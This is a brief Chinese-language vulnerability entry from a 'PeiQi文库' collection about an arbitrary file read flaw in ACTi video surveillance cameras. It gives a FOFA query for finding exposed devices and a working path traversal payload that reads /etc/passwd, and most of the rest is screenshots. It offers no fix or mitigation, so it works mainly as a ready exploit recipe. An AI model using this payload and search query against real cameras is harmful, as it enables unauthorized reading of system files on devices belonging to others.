---
title: ACTI 视频监控 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - ACTI
---

# ACTI 视频监控 任意文件读取漏洞

## 漏洞描述

ACTI 视频监控 存在任意文件读取漏洞

## 漏洞影响

> [!NOTE]
>
> ACTI摄像头

## FOFA

> [!NOTE]
>
> app="ACTi-视频监控"

## 漏洞复现

登录页面如下

![](/img/20210924015205268872.png)

使用Burp抓包

```
/images/../../../../../../../../etc/passwd
```

![](/img/20210924015205559915.png)

## Goby & POC

![](/img/20210924015206874024.png)